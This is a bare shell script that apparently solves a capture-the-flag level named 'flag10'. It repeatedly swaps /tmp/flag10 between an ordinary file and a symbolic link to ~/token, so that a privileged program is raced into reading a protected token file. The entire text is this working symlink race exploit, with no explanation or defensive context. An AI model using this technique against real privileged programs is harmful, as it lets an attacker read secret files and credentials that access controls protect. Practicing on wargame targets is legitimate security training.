#!/bin/sh
while [ 1 ]
do
        rm -rf /tmp/flag10
        touch /tmp/flag10
        rm -rf /tmp/flag10
        ln -s ~/token /tmp/flag10
done

